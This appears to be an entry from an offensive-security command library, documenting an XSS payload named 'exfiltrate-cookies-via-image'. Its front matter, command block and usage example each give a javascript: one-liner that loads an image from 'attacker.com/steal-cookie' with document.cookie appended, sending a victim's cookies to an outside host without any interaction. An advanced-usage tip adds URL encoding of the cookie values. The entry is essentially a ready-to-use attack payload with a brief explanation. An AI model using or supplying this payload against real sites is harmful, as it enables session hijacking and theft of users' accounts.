---
data: >-
  javascript:var img = new Image(); img.src =
  'https://attacker.com/steal-cookie?cookie=' + document.cookie;
tags:
  - xss
  - exfiltration
  - image-beacon
type: command
executor: javascript
platforms:
  - Web
id: 9b27110c-7027-4fd4-8081-43d199e51d93
created_at: '2025-12-13T23:55:06.820Z'
updated_at: '2025-12-13T23:55:06.820Z'
verified: false
validated: true
submitted: true
---
# exfiltrate-cookies-via-image

## Command

```javascript
javascript:var img = new Image(); img.src = 'https://attacker.com/steal-cookie?cookie=' + document.cookie;
```

## Description

This payload creates a new Image object and sets its src to an attacker URL appending document.cookie, triggering a silent GET request to exfiltrate cookies without user interaction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| var img = new Image() | Instantiates a hidden image element | Yes |
| img.src | URL for the request, including cookie data | Yes |
| document.cookie | Appended cookie values | Yes |

## Examples

### Basic Usage

```javascript
javascript:var img = new Image(); img.src = 'https://attacker.com/steal-cookie?cookie=' + document.cookie;
```

Encode for URL use.

### Advanced Usage

Add encoding: encodeURIComponent(document.cookie) for special chars.

## Expected Output

HTTP GET to attacker.com with ?cookie=values in query; logged on server.

## Related

- [[commands/alert-document-cookie]]
- [[procedures/Demonstrate-Cookie-Exfiltration]]
